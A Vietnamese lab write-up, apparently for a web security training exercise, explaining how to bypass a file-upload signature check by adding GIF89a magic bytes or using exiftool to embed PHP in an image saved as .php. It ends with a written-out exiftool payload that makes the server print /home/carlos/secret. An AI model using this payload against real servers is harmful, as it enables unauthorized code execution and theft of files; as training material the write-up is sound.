![image](https://github.com/user-attachments/assets/0c2042c2-b278-4beb-8095-217cae5241a8)![image](https://github.com/user-attachments/assets/a74841be-9302-4137-a4bf-369e38a9ef16)

![image](https://github.com/user-attachments/assets/ae0967c1-45fa-4118-aa3f-13d9f21cb742)

Dường như không được rồi, và lần này nó cũng chỉ thông báo chung chung chứ chả cho lỗi gì cụ thể.

Chúng ta có thể đoán được là nó đã không check extesion cũng như black list mà là nó check signature của file.

### CÁCH 1
như ta được biết thì signature của file gif là `GIF89a`

Tiến hành khai thác.

![image](https://github.com/user-attachments/assets/39b9b3bc-93c4-4317-a1fd-8ce0a4658a2a)

![image](https://github.com/user-attachments/assets/1567cb77-0b39-40bf-82a6-0f09fa018b3b)

![image](https://github.com/user-attachments/assets/42e4b820-7df4-4a6c-9fa9-a33bfc808cf6)

Thành công.

### CÁCH 2
Chúng ta được biết rằng có 1 tool tên là `exiftool` có thể thay đổi metadata của 1 file bất kì, thì bây giờ chúng ta hãy dùng tool đó để chuyển thành dạng `.php` nhưng vẫn có signature của `jpg` nhé.

![image](https://github.com/user-attachments/assets/56a4b6e0-d3a4-4f1e-81ca-89b13ab8b69c)

Tại sao không được, vì không có file ảnh nào tên là `clap.jpg` hết, yêu cầu là phải có 1 file ảnh.

![image](https://github.com/user-attachments/assets/86986999-8175-46de-b44b-a46ca71ec51b)

Đó là được rồi.

![image](https://github.com/user-attachments/assets/db3addb6-f8a9-4263-89b5-b5667ebe00f6)

![image](https://github.com/user-attachments/assets/46f48b51-6742-497a-9a8e-2a420604be2f)

Đó chúng ta đã khai thác thành công.

Nhưng giờ làm sao tìm data, vì thế nên sửa lại payload lại thành như này để ctrl f tìm data dễ hơn.

```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" cat.jpg -o cat.php
```

sửa như này thì chúng ta chỉ việc ctrl f và tìm start thôi, data chắc chắn phía sau start
